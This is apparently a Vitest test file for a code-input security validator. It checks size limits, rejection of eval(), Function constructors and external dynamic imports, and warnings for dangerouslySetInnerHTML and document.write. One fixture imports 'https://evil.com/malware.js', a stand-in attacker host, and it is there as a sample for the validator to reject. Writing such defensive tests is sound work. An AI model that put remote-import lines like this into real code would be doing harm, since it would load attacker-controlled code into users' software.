import { describe, it, expect } from 'vitest';
import { validateInput } from '../../src/security/validator.js';

describe('Security Validator', () => {
  // --- Size limit ---
  describe('size limit', () => {
    it('should reject input exceeding 500 KB', () => {
      const largeInput = 'a'.repeat(500 * 1024 + 1);
      const result = validateInput(largeInput);
      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveLength(1);
      expect(result.errors[0].type).toBe('size');
    });

    it('should accept input exactly at 500 KB', () => {
      const input = 'a'.repeat(500 * 1024);
      const result = validateInput(input);
      expect(result.isValid).toBe(true);
    });
  });

  // --- Injection patterns ---
  describe('injection patterns', () => {
    it('should reject code containing eval()', () => {
      const code = 'const x = eval("alert(1)")';
      const result = validateInput(code);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.type === 'security' && e.message.includes('eval'))).toBe(true);
    });

    it('should reject code containing new Function()', () => {
      const code = 'const fn = new Function("return 1")';
      const result = validateInput(code);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.type === 'security' && e.message.includes('Function constructor'))).toBe(true);
    });

    it('should reject code with dynamic imports from external URLs', () => {
      const code = `const mod = import("https://evil.com/malware.js")`;
      const result = validateInput(code);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.type === 'security' && e.message.includes('Dynamic imports'))).toBe(true);
    });

    it('should allow dynamic imports from relative paths', () => {
      const code = `const mod = import("./myModule")`;
      const result = validateInput(code);
      expect(result.isValid).toBe(true);
    });
  });

  // --- Warning patterns ---
  describe('warning patterns', () => {
    it('should warn about dangerouslySetInnerHTML', () => {
      const code = `<div dangerouslySetInnerHTML={{ __html: content }} />`;
      const result = validateInput(code);
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThanOrEqual(1);
      expect(result.warnings[0].pattern).toBe('dangerouslySetInnerHTML');
      expect(result.warnings[0].severity).toBe('warning');
      expect(result.sanitizedCode).toBe(code);
    });

    it('should warn about document.write', () => {
      const code = `document.write("<h1>Hello</h1>")`;
      const result = validateInput(code);
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThanOrEqual(1);
      expect(result.warnings[0].pattern).toBe('document.write');
    });

    it('should report correct line numbers for warnings', () => {
      const code = `const a = 1;\nconst b = 2;\ndocument.write("x");`;
      const result = validateInput(code);
      expect(result.warnings[0].line).toBe(3);
    });
  });

  // --- Valid input ---
  describe('valid input', () => {
    it('should return sanitizedCode equal to sourceCode for valid input', () => {
      const code = `export function MyComponent() { return <div>Hello</div>; }`;
      const result = validateInput(code);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitizedCode).toBe(code);
    });

    it('should return empty warnings for clean code', () => {
      const code = `const x = 1;`;
      const result = validateInput(code);
      expect(result.warnings).toHaveLength(0);
    });
  });
});
